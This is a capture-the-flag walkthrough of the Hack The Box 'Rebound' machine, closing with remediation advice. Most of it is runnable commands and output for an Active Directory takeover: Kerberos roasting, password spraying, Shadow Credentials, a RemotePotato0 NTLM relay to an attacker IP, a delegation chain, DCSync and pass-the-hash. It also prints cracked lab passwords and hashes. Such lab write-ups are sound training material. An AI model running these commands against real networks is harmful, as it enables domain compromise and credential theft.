---
title: 'HTB Rebound Walkthrough'
description: 'Step-by-step HTB Rebound walkthrough. Execute AS-REP Roasting, exploit Constrained Delegation and Shadow Credentials, chain with RemotePotato0, and dump NTDS.dit secrets.'
date: 2024-12-18
difficulty: Insane
os: Windows
authors:
- name: Bilash J. Shahi
  title: Cybersecurity Professional
  picture: https://avatars.githubusercontent.com/elodvk
  url: https://purplesec.org
tags:
- Hack The Box
- HTB
- Insane
- Windows
- Walkthrough
image: assets/rebound/rebound_banner.png
---

# 🛡️ HTB Rebound Walkthrough

## Machine Overview

**Attack Chain Summary:** Rebound is an insane-difficulty Windows Active Directory machine. The attack path chains anonymous SMB enumeration, unauthenticated Kerberoasting, Shadow Credentials abuse, cross-session NTLM relay via RemotePotato0, and a Resource-Based Constrained Delegation (RBCD) → Constrained Delegation chain to achieve full domain compromise.

| Attribute | Details |
| :--- | :--- |
| **Machine Name** | Rebound |
| **Operating System** | Windows |
| **Difficulty** | Insane |
| **IP Address** | 10.129.229.114 |

---

## Reconnaissance & Enumeration

### Port Scanning

A full TCP port scan identifies multiple services typical of a Domain Controller.

```shell title="Nmap Service Scan"
nmap -sC -sV -p- -oA nmap_report --min-rate 10000 10.129.229.114
```

```text title="Nmap Output"
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0.)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664-49808/tcp  open  msrpc  Microsoft Windows RPC

Host script results:
| smb2-security-mode: 3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m58s
Service Info: Host: DC01; OS: Windows
```

| Port | State | Service | Version | Notes |
| :--- | :--- | :--- | :--- | :--- |
| **53/tcp** | Open | DNS | Simple DNS Plus | Domain resolution. |
| **88/tcp** | Open | Kerberos | Windows Kerberos | Key distribution center. |
| **445/tcp** | Open | SMB | Windows Server | File sharing. Message signing is required. |
| **5985/tcp** | Open | WinRM | HTTPAPI 2.0 | Windows Remote Management for post-exploitation shell access. |

### Service Identification & Web Footprinting

The target domain must be mapped to its IP address in the local `/etc/hosts` file.

```shell title="Updating Local DNS"
echo "10.129.229.114  DC01 DC01.REBOUND.HTB REBOUND.HTB" | sudo tee -a /etc/hosts
```

Guest access to SMB is permitted, revealing a readable `Shared` share (empty) and `IPC$`.

```shell title="SMB Share Enumeration"
netexec smb 10.129.229.114 -u guest -p '' --shares
```

```text title="NetExec Output"
SMB  10.129.229.114  445  DC01  [+] rebound.htb\guest:
SMB  10.129.229.114  445  DC01  Share           Permissions     Remark
SMB  10.129.229.114  445  DC01  -----           -----------     ------
SMB  10.129.229.114  445  DC01  ADMIN$                          Remote Admin
SMB  10.129.229.114  445  DC01  C$                              Default share
SMB  10.129.229.114  445  DC01  IPC$            READ            Remote IPC
SMB  10.129.229.114  445  DC01  NETLOGON                        Logon server share
SMB  10.129.229.114  445  DC01  Shared          READ
SMB  10.129.229.114  445  DC01  SYSVOL                          Logon server share
```

With `IPC$` access via the guest account, domain users can be enumerated by cycling through RID values.

```shell title="RID Brute-Forcing"
netexec smb 10.129.229.114 -u guest -p '' --rid-brute 10000 | grep SidTypeUser | grep -oP '(?<=rebound\\)\S+' > usernames.txt
```

---

## Initial Foothold

### The Vulnerability

With the username list, accounts with Kerberos pre-authentication disabled can be identified. These accounts return an encrypted TGT (AS-REP) that can be cracked offline. In addition, unauthenticated Kerberoasting allows requesting TGS tickets using a no-preauth account without valid credentials.

### Exploitation

```shell title="AS-REP Roasting"
impacket-GetNPUsers rebound/ -usersfile usernames.txt -outputfile hashesToCrack.txt -dc-ip 10.129.229.114
```

```text title="GetNPUsers Output"
$krb5asrep$23$jjones@REBOUND:85a8c3a9465e127d...snip...452d97f
```

Only `jjones` has `DONT_REQUIRE_PREAUTH` set. The AS-REP hash does not crack against `rockyou.txt` — but this account enables unauthenticated Kerberoasting.

```shell title="Unauthenticated Kerberoasting"
impacket-GetUserSPNs rebound.htb/ -no-preauth jjones -usersfile usernames.txt -outputfile hashesToCrack2.txt
```

This returns TGS hashes for `krbtgt`, `DC01$`, `ldap_monitor`, and `delegator$`. The only crackable target is `ldap_monitor`.

```shell title="Cracking ldap_monitor"
hashcat -a 0 -m 13100 ldap_monitor.hash /usr/share/wordlists/rockyou.txt
```

```text title="Hashcat Output"
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$...snip...:1GR8t@$$4u
```

Service account passwords are frequently reused. Spraying `1GR8t@$$4u` across all enumerated users yields another account.

```shell title="Password Spraying"
netexec smb 10.129.229.114 -u usernames.txt -p '1GR8t@$$4u' --continue-on-success
```

```text title="NetExec Output"
SMB  10.129.229.114  445  DC01  [+] rebound.htb\ldap_monitor:1GR8t@$$4u
SMB  10.129.229.114  445  DC01  [+] rebound.htb\oorend:1GR8t@$$4u
```

### Lateral Movement via Shadow Credentials

With valid credentials for `oorend`, AD relationship data is collected via BloodHound.

![Bloodhound Analysis](assets/rebound/bloodhound_rebound_mapping.png)

The attack path reveals `oorend` can add itself to `SERVICEMGMT`, which has `GenericAll` over the `SERVICE USERS` OU containing `winrm_svc`. `winrm_svc` has PSRemote rights to `DC01`.

```shell title="Exploiting the ACL Chain"
bloodyAD -d rebound.htb --dc-ip 10.129.229.114 -u OOREND -p '1GR8t@$$4u' add groupMember SERVICEMGMT OOREND
bloodyAD -d rebound.htb --dc-ip 10.129.229.114 -u OOREND -p '1GR8t@$$4u' add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
```

With GenericAll over the OU, a Shadow Credentials attack is performed on `winrm_svc` using `certipy-ad`.

```shell title="Shadow Credentials Attack"
certipy-ad shadow auto -account winrm_svc -target dc01.rebound.htb \
  -dc-ip 10.129.229.114 -u oorend@REBOUND.HTB -p '1GR8t@$$4u' -k
```

```text title="Certipy Output"
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Key Credential generated with DeviceID 'fd8da56c-802c-e8da-978a-bda7e701b198'
[*] Successfully added Key Credential to 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

### User Flag

With the NTLM hash for `winrm_svc`, a WinRM session is established.

```shell title="Evil-WinRM Access"
evil-winrm -i dc01.rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512
cat C:\Users\winrm_svc\Desktop\user.txt
```

---

## Privilege Escalation

### Enumeration for PrivEsc

A profile folder for `tbrady` exists on the DC. Uploading `RunasCs` reveals an active console session for `tbrady`.

```shell title="Checking Active Sessions"
.\RunasCs.exe x x qwinsta -l 9
```

```text title="RunasCs Output"
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```

### The Misconfiguration

RemotePotato0 exploits DCOM activation to trigger cross-session NTLM authentication. With `tbrady` in Session 1, his authentication can be relayed to capture his NTLMv2 hash.

### Exploitation

Forwarding port 135 to the target's port 9999 and triggering the authentication from Session 1:

```shell title="Setting up Relay & RemotePotato0"
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.229.114:9999
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.104 -p 9999
```

```text title="RemotePotato0 Output"
[*] Spawning COM object in the session: 1
[+] Received the relayed authentication on the RPC relay server on port 9997
[+] User hash stolen!

NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:85e9596881c98920:4ba2f291b8e6405839f775486cad293f:0101000000000000...
```

Cracking the hash reveals `tbrady`'s password as `543BOMBOMBUNmanda`.

BloodHound shows `tbrady` has `ReadGMSAPassword` on `delegator$`, and `delegator$` has Constrained Delegation to `http/dc01.rebound.htb`.

```shell title="Reading gMSA Password"
netexec ldap 10.129.229.114 -d rebound.htb -k -u tbrady -p '543BOMBOMBUNmanda' --gmsa
```

```text title="NetExec Output"
LDAPS  10.129.229.114  636  DC01  [+] rebound.htb\tbrady:543BOMBOMBUNmanda
LDAPS  10.129.229.114  636  DC01  Account: delegator$  NTLM: 4ba33add1108fe560429fc27a1bcab6b
```

A chain of Resource-Based Constrained Delegation (RBCD) and Constrained Delegation is performed to impersonate `DC01$` (which has DCSync privileges).

```shell title="RBCD + Constrained Delegation Chain"
impacket-rbcd 'rebound.htb/delegator$' -hashes :4ba33add1108fe560429fc27a1bcab6b -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate 'DC01$'
impacket-getST -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket 'DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache' "rebound.htb/delegator$" -hashes :4ba33add1108fe560429fc27a1bcab6b -k -no-pass
export KRB5CCNAME=dc01\$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

Using DCSync, the `Administrator` hash is extracted.

```shell title="DCSync"
impacket-secretsdump -no -k dc01.rebound.htb -just-dc-user Administrator
```

```text title="SecretsDump Output"
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
```

### Root Flag

With the Administrator hash, a Pass-the-Hash attack yields a root shell.

```shell title="Pass-the-Hash"
evil-winrm -i dc01.rebound.htb -u administrator -H 176be138594933bb67db3b2572fc91b8
cat C:\Users\Administrator\Desktop\root.txt
```

---

## Conclusion & Takeaways

### Vulnerability Remediation

1. **Enforce Kerberos Pre-Authentication:** `jjones` had `DONT_REQUIRE_PREAUTH` set, enabling unauthenticated Kerberoasting of all SPN-registered accounts. Audit with `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` and enforce pre-auth on all accounts.
2. **Eliminate Password Reuse:** `ldap_monitor` and `oorend` shared the same password, turning a service account compromise into lateral movement. Implement unique passwords per account.
3. **Restrict OU Delegation Permissions:** `SERVICEMGMT` group members held GenericAll over the `SERVICE USERS` OU, enabling Shadow Credentials attacks. Apply least-privilege delegation and remove GenericAll.
4. **Mitigate Cross-Session NTLM Relay:** RemotePotato0 exploited DCOM activation to relay `tbrady`'s NTLM credentials across sessions. Disable NTLM where feasible and apply DCOM hardening.
5. **Secure gMSA Password Readers:** `tbrady` had `ReadGMSAPassword` on `delegator$`, exposing its NTLM hash. Limit `PrincipalsAllowedToRetrieveManagedPassword` to only the computer accounts that run the managed service.

### Key Lessons

*   **Chaining Delegation Types Creates Complex Attack Paths:** The combination of RBCD and Constrained Delegation bypassed the `NOT_DELEGATED` protection on the Administrator account by pivoting through the `DC01$` machine account.
*   **Shadow Credentials Are a Stealthy Persistence Mechanism:** Writing to the `msDS-KeyCredentialLink` attribute allows PKINIT authentication without knowing the user's password, effectively bypassing password resets.
